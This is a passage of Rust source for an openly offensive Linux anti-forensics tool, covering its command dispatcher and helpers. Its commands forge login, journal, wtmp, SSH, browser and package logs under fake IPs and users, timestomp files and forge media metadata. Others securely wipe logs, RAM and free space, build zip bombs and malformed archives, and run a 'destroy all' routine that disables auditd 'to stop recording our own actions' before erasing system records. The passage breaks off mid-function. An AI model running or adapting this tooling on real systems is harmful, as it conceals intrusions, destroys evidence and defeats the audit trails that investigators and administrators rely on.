                    user_homes: home,
                    verbose: true,
                };
                let s = forge_ssh(&opts);
                eprintln!(
                    "[+] forge-ssh: {} entries, {} files",
                    s.entries_added, s.files_touched
                );
                if s.errors > 0 {
                    report.push("forge-ssh", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("forge-ssh");
                }
            } else {
                report.push_ok("forge-ssh [dry-run]");
            }
        }

        Cmd::ForgeBrowser {
            n_urls,
            ts_start,
            ts_end,
            profile,
        } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let ts_e = ts_end.unwrap_or(now);
            let ts_s = ts_start.unwrap_or(ts_e - 259_200); // 72h
            eprintln!("[*] ForgeBrowser: {} URLs per DB", n_urls);
            if !dry {
                let opts = BrowserForgeOpts {
                    n_urls,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    profile_path: profile,
                    verbose: true,
                };
                let s = forge_browser_history(&opts);
                eprintln!(
                    "[+] forge-browser: {} URLs, {} DBs",
                    s.urls_injected, s.dbs_touched
                );
                if s.errors > 0 {
                    report.push("forge-browser", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("forge-browser");
                }
            } else {
                report.push_ok("forge-browser [dry-run]");
            }
        }

        Cmd::ForgeWtmp {
            fake_ip,
            fake_user,
            n_sessions,
            ts_start,
            ts_end,
        } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let ts_e = ts_end.unwrap_or(now);
            let ts_s = ts_start.unwrap_or(ts_e - 172_800);
            eprintln!(
                "[*] ForgeWtmp: {} sessions, IP={}, user={}",
                n_sessions, fake_ip, fake_user
            );
            if !dry {
                let opts = WtmpForgeOpts {
                    fake_ip,
                    fake_user,
                    n_sessions,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    verbose: true,
                };
                let s = forge_wtmp(&opts);
                eprintln!(
                    "[+] forge-wtmp: {} records written, {} files, {} errors",
                    s.records_written, s.files_touched, s.errors
                );
                if s.errors > 0 {
                    report.push("forge-wtmp", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("forge-wtmp");
                }
            } else {
                report.push_ok("forge-wtmp [dry-run]");
            }
        }

        Cmd::ForgeJournal {
            fake_ip,
            fake_user,
            n_entries,
            ts_start,
            ts_end,
        } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let ts_e = ts_end.unwrap_or(now);
            let ts_s = ts_start.unwrap_or(ts_e - 172_800);
            eprintln!(
                "[*] ForgeJournal: {} entries, IP={}, user={}",
                n_entries, fake_ip, fake_user
            );
            if !dry {
                let opts = JournalForgeOpts {
                    fake_ip,
                    fake_user,
                    n_entries,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    verbose: true,
                };
                let s = forge_journal(&opts);
                eprintln!(
                    "[+] forge-journal: {} entries sent, {} errors",
                    s.entries_sent, s.errors
                );
                if s.errors > 0 {
                    report.push("forge-journal", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("forge-journal");
                }
            } else {
                report.push_ok("forge-journal [dry-run]");
            }
        }

        Cmd::SecureDelete { targets, passes } => {
            eprintln!(
                "[*] SecureDelete: {} target(s), {} passes",
                targets.len(),
                passes
            );
            if !dry {
                let s = secure_delete_targets(&targets, passes, true);
                eprintln!(
                    "[+] secure-delete: {} files, {} bytes, {} errors",
                    s.files_deleted, s.bytes_wiped, s.errors
                );
                if s.errors > 0 {
                    report.push("secure-delete", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("secure-delete");
                }
            } else {
                report.push_ok("secure-delete [dry-run]");
            }
        }

        Cmd::MemoryWipe => {
            eprintln!("[*] MemoryWipe: flushing page cache + filling free RAM...");
            if !dry {
                let s = wipe_memory(true);
                eprintln!(
                    "[+] memory-wipe: {} MiB zeroed, cache_dropped={}",
                    s.bytes_zeroed / 1_048_576,
                    s.cache_dropped
                );
                report.push_ok("memory-wipe");
            } else {
                report.push_ok("memory-wipe [dry-run]");
            }
        }

        Cmd::ProcClean => {
            eprintln!("[*] ProcClean: removing recently-used, thumbnails, session traces...");
            if !dry {
                let s = clean_proc_artifacts(true);
                eprintln!(
                    "[+] proc-clean: {} files, {} dirs, {} errors",
                    s.files_removed, s.dirs_removed, s.errors
                );
                if s.errors > 0 {
                    report.push("proc-clean", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("proc-clean");
                }
            } else {
                report.push_ok("proc-clean [dry-run]");
            }
        }

        Cmd::DockerCover => {
            eprintln!("[*] DockerCover: wiping container logs, credentials, build cache...");
            if !dry {
                let s = wipe_docker_artifacts(true);
                eprintln!(
                    "[+] docker-cover: {} logs, {} configs, {} dirs, {} errors",
                    s.logs_wiped, s.configs_wiped, s.dirs_removed, s.errors
                );
                if s.errors > 0 {
                    report.push("docker-cover", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("docker-cover");
                }
            } else {
                report.push_ok("docker-cover [dry-run]");
            }
        }

        Cmd::SelfAudit {
            findings_json: emit_json,
        } => {
            let findings = audit_artifacts(true);
            if emit_json {
                let items: Vec<String> = findings
                    .iter()
                    .map(|f| {
                        format!(
                        "{{\"category\":\"{}\",\"path\":\"{}\",\"severity\":{},\"desc\":\"{}\"}}",
                        f.category, f.path, f.severity,
                        f.description.replace('"', "\\\"")
                    )
                    })
                    .collect();
                println!("[{}]", items.join(","));
            }
            let high = findings.iter().filter(|f| f.severity >= 3).count();
            let med = findings.iter().filter(|f| f.severity == 2).count();
            eprintln!(
                "[+] self-audit: {} findings ({} HIGH, {} MEDIUM)",
                findings.len(),
                high,
                med
            );
            if findings.is_empty() {
                report.push_ok("self-audit");
            } else {
                report.push(
                    "self-audit",
                    Err(format!("{} residual artifacts detected", findings.len())),
                );
            }
        }

        Cmd::WipeLastlog => {
            eprintln!("[*] WipeLastlog: zeroing /var/log/lastlog entries...");
            if !dry {
                let s = wipe_lastlog(true);
                eprintln!(
                    "[+] wipe-lastlog: {} zeroed, {} errors",
                    s.entries_wiped, s.errors
                );
                if s.errors > 0 {
                    report.push("wipe-lastlog", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("wipe-lastlog");
                }
            } else {
                report.push_ok("wipe-lastlog [dry-run]");
            }
        }

        Cmd::ForgeLastlog { ts_start, ts_end } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let ts_e = ts_end.unwrap_or(now);
            let ts_s = ts_start.unwrap_or(ts_e - 7 * 86_400);
            eprintln!("[*] ForgeLastlog: injecting fake last-login entries...");
            if !dry {
                let s = forge_lastlog(ts_s, ts_e, true);
                eprintln!(
                    "[+] forge-lastlog: {} forged, {} errors",
                    s.entries_forged, s.errors
                );
                if s.errors > 0 {
                    report.push("forge-lastlog", Err(format!("{} error(s)", s.errors)));
                } else {
                    report.push_ok("forge-lastlog");
                }
            } else {
                report.push_ok("forge-lastlog [dry-run]");
            }
        }

        Cmd::ExifForge(args) => {
            let ExifForgeArgs {
                path,
                make,
                model,
                software,
                artist,
                datetime,
                gps_lat,
                gps_lon,
                no_gps,
                iso,
                focal_length,
                pixel_x,
                pixel_y,
                pdf_author,
                pdf_creator,
                pdf_producer,
                pdf_title,
                pdf_created,
                pdf_modified,
                mp4_encoder,
                mp4_ts_create,
                mp4_ts_modify,
            } = *args;
            let lower = path.to_lowercase();
            let fmt = if lower.ends_with(".jpg") || lower.ends_with(".jpeg") {
                "jpeg"
            } else if lower.ends_with(".pdf") {
                "pdf"
            } else if lower.ends_with(".mp4") {
                "mp4"
            } else {
                ""
            };
            if fmt.is_empty() {
                report.push(
                    "exif-forge",
                    Err(format!(
                        "{}: unknown format (need .jpg/.jpeg/.pdf/.mp4)",
                        path
                    )),
                );
            } else {
                eprintln!("[*] ExifForge: {} ({} metadata)", path, fmt);
                if !dry {
                    let res = match fmt {
                        "jpeg" => forge_jpeg_exif(
                            &path,
                            &ExifForgeOpts {
                                make,
                                model,
                                software,
                                artist: artist.unwrap_or_default(),
                                datetime,
                                gps_lat: if no_gps { None } else { Some(gps_lat) },
                                gps_lon: if no_gps { None } else { Some(gps_lon) },
                                iso,
                                focal_length_mm: focal_length,
                                pixel_x,
                                pixel_y,
                                verbose: true,
                            },
                        ),
                        "pdf" => forge_pdf_metadata(
                            &path,
                            &PdfMetaOpts {
                                author: pdf_author,
                                creator: pdf_creator,
                                producer: pdf_producer,
                                title: pdf_title,
                                created: pdf_created,
                                modified: pdf_modified,
                                verbose: true,
                            },
                        ),
                        _ => forge_mp4_metadata(
                            &path,
                            &Mp4MetaOpts {
                                encoder: mp4_encoder,
                                ts_create: mp4_ts_create,
                                ts_modify: mp4_ts_modify,
                                verbose: true,
                            },
                        ),
                    };
                    report.push("exif-forge", res);
                } else {
                    // No dry-run mode in the module — validate the target, don't write
                    match std::fs::metadata(&path) {
                        Ok(m) if m.is_file() => {
                            eprintln!(
                                "[*] dry-run: would forge {} metadata in {} ({} B)",
                                fmt,
                                path,
                                m.len()
                            );
                            report.push_ok("exif-forge [dry-run]");
                        }
                        _ => report
                            .push("exif-forge [dry-run]", Err(format!("{}: not a file", path))),
                    }
                }
            }
        }

        Cmd::TrapArchive {
            output,
            variant,
            layers,
            width,
            leaf_size_mib,
            claimed_gb,
            malform,
        } => {
            eprintln!("[*] TrapArchive: {:?} → {}", variant, output);
            if !dry {
                let stats = match variant {
                    TrapVariantArg::NestedBomb => {
                        let opts = BombOpts {
                            layers,
                            width,
                            leaf_uncomp_size: leaf_size_mib.saturating_mul(1024 * 1024),
                            verbose: true,
                        };
                        create_nested_bomb(&output, &opts)
                    }
                    TrapVariantArg::Oversized => create_oversized_zip(&output, claimed_gb, true),
                    TrapVariantArg::Malformed => {
                        let v = match malform {
                            MalformArg::BadCrc => MalformVariant::BadCrc,
                            MalformArg::TruncatedData => MalformVariant::TruncatedData,
                            MalformArg::CorruptSignature => MalformVariant::CorruptSignature,
                            MalformArg::InfiniteRecurse => MalformVariant::InfiniteRecurse,
                        };
                        create_malformed_zip(&output, v, true)
                    }
                };
                eprintln!(
                    "[+] trap-archive: {} file(s) created, {} errors",
                    stats.files_created, stats.errors
                );
                if stats.errors > 0 {
                    report.push("trap-archive", Err(format!("{} error(s)", stats.errors)));
                } else {
                    report.push_ok("trap-archive");
                }
            } else {
                // No dry-run mode in the module — report the plan, don't write
                match variant {
                    TrapVariantArg::NestedBomb => {
                        let claimed = (width as u64)
                            .saturating_pow(layers)
                            .saturating_mul(leaf_size_mib as u64)
                            .saturating_mul(1024 * 1024);
                        eprintln!(
                            "[*] dry-run: would write nested bomb {} \
                            (layers={}, width={}, leaf={} MiB, claims ~{} B extracted)",
                            output, layers, width, leaf_size_mib, claimed
                        );
                    }
                    TrapVariantArg::Oversized => {
                        eprintln!(
                            "[*] dry-run: would write oversized ZIP {} claiming {} GiB",
                            output, claimed_gb
                        );
                    }
                    TrapVariantArg::Malformed => {
                        eprintln!(
                            "[*] dry-run: would write malformed ZIP {} ({:?})",
                            output, malform
                        );
                    }
                }
                report.push_ok("trap-archive [dry-run]");
            }
        }

        Cmd::StegoHoney {
            path,
            seed,
            payload_size,
            tool_sig,
        } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let seed = seed.unwrap_or(now as u64);
            let is_dir = std::path::Path::new(&path).is_dir();
            eprintln!(
                "[*] StegoHoney: {} (seed={}, payload={} B)",
                path, seed, payload_size
            );
            if !dry {
                if is_dir {
                    let n = inject_directory_honey(&path, seed, payload_size, true);
                    eprintln!("[+] stego-honey: {} file(s) injected in {}", n, path);
                    report.push_ok("stego-honey");
                } else {
                    let payload = generate_honey_payload(seed, payload_size);
                    let lower = path.to_lowercase();
                    let res = if lower.ends_with(".jpg") || lower.ends_with(".jpeg") {
                        inject_jpeg_honey(&path, &payload, true)
                    } else if lower.ends_with(".png") {
                        inject_png_honey(&path, &payload, true)
                    } else if lower.ends_with(".wav") {
                        inject_wav_honey(&path, &payload, true)
                    } else {
                        inject_trailer_honey(&path, &payload, tool_sig.as_bytes(), true)
                    };
                    report.push("stego-honey", res);
                }
            } else {
                // No dry-run mode in the module — validate the target, don't write
                let valid = if is_dir {
                    eprintln!("[*] dry-run: would inject {} B honey payloads into JPEG/PNG/WAV files under {}",
                        payload_size, path);
                    true
                } else if std::path::Path::new(&path).is_file() {
                    eprintln!(
                        "[*] dry-run: would inject {} B honey payload into {}",
                        payload_size, path
                    );
                    true
                } else {
                    false
                };
                if valid {
                    report.push_ok("stego-honey [dry-run]");
                } else {
                    report.push(
                        "stego-honey [dry-run]",
                        Err(format!("{}: no such file or directory", path)),
                    );
                }
            }
        }

        Cmd::Timestomp { path, ts } => {
            // Parse ts: Unix integer or ISO-8601 (YYYY-MM-DDTHH:MM:SS or YYYY-MM-DD HH:MM:SS)
            let unix_ts: i64 = if let Ok(n) = ts.trim().parse() {
                n
            } else {
                // Minimal ISO-8601 parser: "YYYY-MM-DDTHH:MM:SS" or "YYYY-MM-DD HH:MM:SS"
                let s = ts.replace('T', " ");
                let parts: Vec<&str> = s.split_whitespace().collect();
                if parts.len() == 2 {
                    let date: Vec<u32> =
                        parts[0].split('-').filter_map(|x| x.parse().ok()).collect();
                    let time: Vec<u32> =
                        parts[1].split(':').filter_map(|x| x.parse().ok()).collect();
                    if date.len() == 3 && time.len() >= 2 {
                        // Approximate: days since epoch, not accounting for leap years precisely
                        let y = date[0] as i64;
                        let m = date[1] as i64;
                        let d = date[2] as i64;
                        // Days since 1970-01-01 via Gregorian formula
                        let days = (y - 1970) * 365 + (y - 1969) / 4 - (y - 1901) / 100
                            + (y - 1601) / 400
                            + [0i64, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334]
                                [(m as usize).saturating_sub(1).min(11)]
                            + d
                            - 1;
                        days * 86_400
                            + time[0] as i64 * 3600
                            + time[1] as i64 * 60
                            + time.get(2).copied().unwrap_or(0) as i64
                    } else {
                        eprintln!("[!] timestomp: invalid timestamp format: {}", ts);
                        std::process::exit(1);
                    }
                } else {
                    eprintln!("[!] timestomp: invalid timestamp format: {}", ts);
                    std::process::exit(1);
                }
            };

            eprintln!("[*] Timestomp: {} → unix_ts={}", path, unix_ts);
            if !dry {
                let tp = libc::timespec {
                    tv_sec: unix_ts,
                    tv_nsec: 0,
                };
                let times = [tp, tp]; // [atime, mtime]
                let path_cstr = std::ffi::CString::new(path.as_bytes()).unwrap();
                let ret = unsafe {
                    libc::utimensat(libc::AT_FDCWD, path_cstr.as_ptr(), times.as_ptr(), 0)
                };
                if ret == 0 {
                    eprintln!("[+] timestomp: atime+mtime set to {}", unix_ts);
                    report.push_ok("timestomp");
                } else {
                    let e = std::io::Error::last_os_error();
                    report.push("timestomp", Err(format!("{}: {}", path, e)));
                }
            } else {
                report.push_ok("timestomp [dry-run]");
            }
        }

        Cmd::ForgeAll {
            fake_ip,
            fake_user,
            n,
            ts_start,
            ts_end,
        } => {
            let now = unsafe { libc::time(std::ptr::null_mut()) };
            let ts_e = ts_end.unwrap_or(now);
            let ts_s = ts_start.unwrap_or(ts_e - 172_800); // 48h
            eprintln!(
                "[*] FORGE ALL — Linux (n={}, IP={}, user={})",
                n, fake_ip, fake_user
            );
            if !dry {
                // 1. Log injection
                let mut bash_paths = vec!["/root/.bash_history".to_string()];
                if let Ok(rd) = std::fs::read_dir("/home") {
                    for e in rd.flatten() {
                        bash_paths
                            .push(e.path().join(".bash_history").to_string_lossy().to_string());
                    }
                }
                let log_opts = LogForgeOpts {
                    fake_ip: fake_ip.clone(),
                    fake_user: fake_user.clone(),
                    n_sessions: n,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    fake_hostname: None,
                    do_auth: true,
                    do_syslog: true,
                    bash_history_paths: bash_paths,
                    verbose: false,
                };
                let ls = forge_logs(&log_opts);
                eprintln!(
                    "[+] forge-all: log → {} lines, {} files",
                    ls.lines_written, ls.files_touched
                );

                // 2. Package manager logs
                let pkg_opts = PkgForgeOpts {
                    n_packages: n + 5,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    verbose: false,
                };
                let ps = forge_pkg_logs(&pkg_opts);
                eprintln!(
                    "[+] forge-all: pkg → {} lines, {} files",
                    ps.lines_written, ps.files_touched
                );

                // 3. SSH known_hosts
                let ssh_opts = SshForgeOpts {
                    hosts: vec![],
                    n_random: n / 2 + 3,
                    user_homes: vec![],
                    verbose: false,
                };
                let ss = forge_ssh(&ssh_opts);
                eprintln!(
                    "[+] forge-all: ssh → {} entries, {} files",
                    ss.entries_added, ss.files_touched
                );

                // 4. Browser history
                let br_opts = BrowserForgeOpts {
                    n_urls: n + 10,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    profile_path: None,
                    verbose: false,
                };
                let bs = forge_browser_history(&br_opts);
                eprintln!(
                    "[+] forge-all: browser → {} URLs, {} DBs",
                    bs.urls_injected, bs.dbs_touched
                );

                // 5. wtmp / utmp binary records
                let wt_opts = WtmpForgeOpts {
                    fake_ip: fake_ip.clone(),
                    fake_user: fake_user.clone(),
                    n_sessions: n / 2 + 2,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    verbose: false,
                };
                let wt = forge_wtmp(&wt_opts);
                eprintln!(
                    "[+] forge-all: wtmp → {} records, {} files",
                    wt.records_written, wt.files_touched
                );

                // 6. systemd journal entries
                let jn_opts = JournalForgeOpts {
                    fake_ip: fake_ip.clone(),
                    fake_user: fake_user.clone(),
                    n_entries: n,
                    ts_start: ts_s,
                    ts_end: ts_e,
                    verbose: false,
                };
                let jn = forge_journal(&jn_opts);
                eprintln!("[+] forge-all: journal → {} entries sent", jn.entries_sent);

                let total_errors =
                    ls.errors + ps.errors + ss.errors + bs.errors + wt.errors + jn.errors;
                if total_errors > 0 {
                    report.push("forge-all", Err(format!("{} error(s)", total_errors)));
                } else {
                    report.push_ok("forge-all");
                }
            } else {
                report.push_ok("forge-all [dry-run]");
            }
        }

        // ── Encryption ────────────────────────────────────────────────────────
        Cmd::CreateContainer {
            output,
            size_mib,
            algo,
            kdf_iters,
            pass_env,
        } => {
            let pass = require_passphrase(&pass_env);
            let size = size_mib * 1024 * 1024;
            eprintln!(
                "[*] Create container: {} ({} MiB, {:?})",
                output, size_mib, algo
            );
            if !dry {
                report.push(
                    "create-container",
                    create_container(&output, size, map_crypto_algo(algo), &pass, kdf_iters, true),
                );
            } else {
                report.push_ok("create-container [dry-run]");
            }
        }

        Cmd::EncryptFile {
            input,
            output,
            algo,
            kdf_iters,
            pass_env,
        } => {
            let pass = require_passphrase(&pass_env);
            eprintln!("[*] Encrypt file: {} → {}", input, output);
            if !dry {
                match encrypt_file(&input, &output, map_crypto_algo(algo), &pass, kdf_iters) {
                    Ok(b) => {
                        eprintln!("[+] encrypt-file: {} bytes", b);
                        report.push_ok("encrypt-file");
                    }
                    Err(e) => report.push("encrypt-file", Err(e)),
                }
            } else {
                report.push_ok("encrypt-file [dry-run]");
            }
        }

        Cmd::EncryptDir {
            input,
            output,
            algo,
            kdf_iters,
            pass_env,
        } => {
            let pass = require_passphrase(&pass_env);
            eprintln!("[*] Encrypt dir: {} → {}", input, output);
            if !dry {
                match encrypt_dir(&input, &output, map_crypto_algo(algo), &pass, kdf_iters) {
                    Ok(b) => {
                        eprintln!("[+] encrypt-dir: {} bytes", b);
                        report.push_ok("encrypt-dir");
                    }
                    Err(e) => report.push("encrypt-dir", Err(e)),
                }
            } else {
                report.push_ok("encrypt-dir [dry-run]");
            }
        }

        Cmd::Decrypt {
            input,
            output,
            pass_env,
        } => {
            let pass = require_passphrase(&pass_env);
            eprintln!("[*] Decrypt: {} → {}", input, output);
            if !dry {
                match decrypt_container(&input, &output, &pass) {
                    Ok(b) => {
                        eprintln!("[+] decrypt: {} bytes", b);
                        report.push_ok("decrypt");
                    }
                    Err(e) => report.push("decrypt", Err(e)),
                }
            } else {
                report.push_ok("decrypt [dry-run]");
            }
        }

        Cmd::Extract {
            input,
            output,
            pass_env,
        } => {
            let pass = require_passphrase(&pass_env);
            eprintln!("[*] Extract container: {} → {}/", input, output);
            if !dry {
                match extract_dir(&input, &output, &pass) {
                    Ok(b) => {
                        eprintln!("[+] extract: {} bytes", b);
                        report.push_ok("extract");
                    }
                    Err(e) => report.push("extract", Err(e)),
                }
            } else {
                report.push_ok("extract [dry-run]");
            }
        }

        Cmd::EncryptDevice {
            device,
            algo,
            kdf_iters,
            pass_env,
        } => {
            let pass = require_passphrase(&pass_env);
            eprintln!(
                "[*] Encrypt device in-place: {} ({:?}) — IRREVERSIBLE",
                device, algo
            );
            if !dry {
                report.push(
                    "encrypt-device",
                    encrypt_device(&device, map_crypto_algo(algo), &pass, kdf_iters, true),
                );
            } else {
                report.push_ok("encrypt-device [dry-run]");
            }
        }

        Cmd::DestroyAndEncrypt {
            sources,
            output,
            algo,
            kdf_iters,
            pass_env,
        } => {
            if sources.is_empty() {
                eprintln!("[!] destroy-and-encrypt: no sources specified");
                std::process::exit(1);
            }
            let pass = require_passphrase(&pass_env);
            eprintln!(
                "[*] Destroy-and-encrypt: {} source(s) → {}",
                sources.len(),
                output
            );
            if !dry {
                let src_refs: Vec<&str> = sources.iter().map(String::as_str).collect();
                match destroy_and_encrypt(
                    &src_refs,
                    &output,
                    map_crypto_algo(algo),
                    &pass,
                    kdf_iters,
                ) {
                    Ok(b) => {
                        eprintln!("[+] destroy-and-encrypt: {} bytes, sources wiped", b);
                        report.push_ok("destroy-and-encrypt");
                    }
                    Err(e) => report.push("destroy-and-encrypt", Err(e)),
                }
            } else {
                report.push_ok("destroy-and-encrypt [dry-run]");
            }
        }

        Cmd::EncryptLayers {
            input,
            output,
            layer,
            kdf_iters,
            pass_env,
        } => {
            if layer.len() < 2 {
                eprintln!("[!] encrypt-layers: specify at least 2 --layer flags (use encrypt-file for a single layer)");
                std::process::exit(1);
            }
            let mut layers: Vec<Layer> = Vec::with_capacity(layer.len());
            for (i, la) in layer.iter().enumerate() {
                let pass = layer_passphrase(&pass_env, i);
                layers.push(Layer {
                    algo: map_crypto_algo(la.clone()),
                    passphrase: pass,
                });
            }
            eprintln!(
                "[*] Encrypt layers: {} → {} ({} layers, innermost→outermost: {:?})",
                input,
                output,
                layer.len(),
                layer
            );
            if !dry {
                match encrypt_layers(&input, &output, &layers, kdf_iters) {
                    Ok(b) => {
                        eprintln!("[+] encrypt-layers: {} plaintext bytes", b);
                        report.push_ok("encrypt-layers");
                    }
                    Err(e) => report.push("encrypt-layers", Err(e)),
                }
            } else {
                report.push_ok("encrypt-layers [dry-run]");
            }
        }

        // ── Hashing ───────────────────────────────────────────────────────────
        Cmd::Hash { path, algo } => {
            let halgo = map_hash_algo(algo);
            match hash_file(&path, halgo) {
                Ok(digest) => println!("{}  {}", to_hex(&digest), path),
                Err(e) => {
                    eprintln!("[!] hash: {}", e);
                    std::process::exit(1);
                }
            }
            return; // no report entry for pure query commands
        }
    }

    if json {
        report.print_json();
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn map_ts(t: TsArg) -> TsStrategy {
    match t {
        TsArg::RandomPlausible => TsStrategy::RandomPlausible,
        TsArg::RandomFull => TsStrategy::RandomFull,
        TsArg::Epoch => TsStrategy::Epoch,
        TsArg::Clone => TsStrategy::Clone,
    }
}

#[cfg(target_os = "linux")]
fn parse_replacements(pairs: &[String]) -> Vec<LogpReplace> {
    pairs
        .iter()
        .filter_map(|s| {
            let mut p = s.splitn(2, ':');
            let n = p.next()?.to_string();
            let r = p.next().unwrap_or("").to_string();
            Some(LogpReplace {
                needle: n,
                replacement: r,
            })
        })
        .collect()
}

#[cfg(target_os = "linux")]
fn map_crypto_algo(a: CryptoAlgoArg) -> Algorithm {
    match a {
        CryptoAlgoArg::Aes => Algorithm::Aes256,
        CryptoAlgoArg::Twofish => Algorithm::Twofish256,
        CryptoAlgoArg::Camellia => Algorithm::Camellia256,
        CryptoAlgoArg::Cascade => Algorithm::AesTwofish,
        CryptoAlgoArg::Kuznyechik => Algorithm::Kuznyechik,
    }
}

#[cfg(target_os = "linux")]
fn map_hash_algo(a: HashAlgoArg) -> HashAlgo {
    match a {
        HashAlgoArg::Sha256 => HashAlgo::Sha256,
        HashAlgoArg::Sha512 => HashAlgo::Sha512,
        HashAlgoArg::Blake2b => HashAlgo::Blake2b512,
        HashAlgoArg::Sha3256 => HashAlgo::Sha3_256,
        HashAlgoArg::Sha3512 => HashAlgo::Sha3_512,
    }
}

/// Get passphrase: check env var first, fallback to no-echo terminal prompt.
#[cfg(target_os = "linux")]
fn get_passphrase(env_var: &str) -> Option<Vec<u8>> {
    if let Ok(s) = std::env::var(env_var) {
        if !s.is_empty() {
            return Some(s.into_bytes());
        }
    }
    prompt_passphrase_noecho(env_var).ok()
}

/// Passphrase required — exits if not available.
#[cfg(target_os = "linux")]
fn require_passphrase(env_var: &str) -> Vec<u8> {
    match get_passphrase(env_var) {
        Some(p) => p,
        None => {
            eprintln!(
                "[!] could not obtain passphrase from '{}' or terminal",
                env_var
            );
            std::process::exit(1);
        }
    }
}

/// Passphrase for nested layer `idx` (0-based): uses `<pass_env>_<idx+1>`
/// (e.g. SATAN2_PASS_2), except layer 0 which falls back to the plain
/// `<pass_env>` var first. Prompts on the terminal if unset.
#[cfg(target_os = "linux")]
fn layer_passphrase(pass_env: &str, idx: usize) -> Vec<u8> {
    if idx == 0 {
        if let Ok(s) = std::env::var(pass_env) {
            if !s.is_empty() {
                return s.into_bytes();
            }
        }
    }
    require_passphrase(&format!("{}_{}", pass_env, idx + 1))
}

/// Read passphrase from /dev/tty with echo disabled.
#[cfg(target_os = "linux")]
fn prompt_passphrase_noecho(env_var: &str) -> Result<Vec<u8>, String> {
    let tty_fd = unsafe { libc::open(c"/dev/tty".as_ptr(), libc::O_RDWR) };
    if tty_fd < 0 {
        return Err(format!("'{}' not set and /dev/tty unavailable", env_var));
    }

    // Save terminal state and disable echo
    let mut old: libc::termios = unsafe { std::mem::zeroed() };
    unsafe { libc::tcgetattr(tty_fd, &mut old) };
    let mut noecho = old;
    noecho.c_lflag &= !(libc::ECHO | libc::ECHOE | libc::ECHOK | libc::ECHONL);
    unsafe { libc::tcsetattr(tty_fd, libc::TCSANOW, &noecho) };

    let prompt = format!("[?] {} not set — passphrase: ", env_var);
    unsafe { libc::write(tty_fd, prompt.as_ptr() as *const libc::c_void, prompt.len()) };

    let mut buf: Vec<u8> = Vec::new();
    let mut byte = [0u8; 1];
    loop {
        let n = unsafe { libc::read(tty_fd, byte.as_mut_ptr() as *mut libc::c_void, 1) };
        if n <= 0 || byte[0] == b'\n' || byte[0] == b'\r' {
            break;
        }
        buf.push(byte[0]);
    }

    unsafe {
        libc::tcsetattr(tty_fd, libc::TCSANOW, &old);
        libc::write(tty_fd, b"\n".as_ptr() as *const libc::c_void, 1);
        libc::close(tty_fd);
    }

    if buf.is_empty() {
        Err("passphrase cannot be empty".to_string())
    } else {
        Ok(buf)
    }
}

// ── Orchestration helpers ─────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
fn run_destroy_all(dry: bool, reenable_audit: bool, device: Option<&str>, report: &mut Report) {
    // 1. Disable audit first — stop recording our own actions
    eprintln!("\n[*] == Auditd ==");
    if !dry {
        let mut s = AuditStats::default();
        report.push("auditd", wipe_audit_logs(reenable_audit, &mut s));
    } else {
        report.push_ok("auditd [dry-run]");
    }

    // 2. Wipe all system logs
    eprintln!("\n[*] == Log Poison ==");
    if !dry {
        let opts = LogpOpts {
            mode: LogpMode::Destroy,
            replacements: vec![],
            scramble_ts: false,
            ts_window_start: 0,
            ts_window_end: 0,
            do_auth_log: true,
            do_syslog: true,
            do_wtmp: true,
            do_bash_history: true,
            do_journal: true,
            extra_logs: vec![],
            verbose: true,
        };
        let mut s = LogpStats::default();
        report.push("log-poison", log_poison(&opts, &mut s));
    } else {
        report.push_ok("log-poison [dry-run]");
    }

    // 3. SSH artifacts (full destroy)
    eprintln!("\n[*] == SSH Clean ==");
    if !dry {
        let opts = SshCleanOpts {
            hosts: &[],
            key_fragments: &[],
            destroy_all: true,
            wipe_keys: true,
            wipe_config: true,
        };
        let mut s = SshCleanStats::default();
        report.push("ssh-clean", ssh_clean(&opts, &mut s));
    } else {
        report.push_ok("ssh-clean [dry-run]");
    }

    // 4. Browser history
    eprintln!("\n[*] == Browser History ==");
    if !dry {
        wipe_browser_history_linux(false);
        report.push_ok("browser-linux");
    } else {
        report.push_ok("browser-linux [dry-run]");
    }

    // 5. Package manager logs
    eprintln!("\n[*] == Package Manager Logs ==");
    if !dry {
        wipe_pkg_logs(false);
        report.push_ok("pkg-logs");
    } else {
        report.push_ok("pkg-logs [dry-run]");
    }

    // 6. Timestamp scramble on sensitive dirs
    eprintln!("\n[*] == Meta ==");
    let dirs: &[(&str, &'static str)] = &[
        ("/home", "meta:/home"),
        ("/root", "meta:/root"),
        ("/var/log", "meta:/var/log"),
        ("/tmp", "meta:/tmp"),
        ("/var/tmp", "meta:/var/tmp"),
    ];
    for (dir, label) in dirs {
        if std::path::Path::new(dir).exists() {
            if !dry {
                let opts = MetaOpts {
                    do_timestamps: true,
                    do_sig_mask: false,
                    do_xattrs: true,
                    recursive: true,
                    ts_strategy: TsStrategy::RandomPlausible,
                    ts_clone_ref: None,
                    sig_strategy: SigStrategy::Random,
                    verbose: false,
                };
                report.push(label, meta_process(dir, &opts));
            } else {
                report.push_ok("meta [dry-run]");
            }
        }
    }

    // 7. Free space wipe
    eprintln!("\n[*] == Slack ==");
    if !dry {
        let mut s = SlackStats::default();
        report.push("slack", slack_wipe_free("/", &mut s));
    } else {
        report.push_ok("slack [dry-run]");
    }

    // 8. Network state
    eprintln!("\n[*] == Net Clean ==");
    if !dry {
        let mut s = NetCleanStats::default();
        net_clean_all(&mut s);
        report.push_ok("net-clean");
    } else {
        report.push_ok("net-clean [dry-run]");
    }

    // 9. Swap
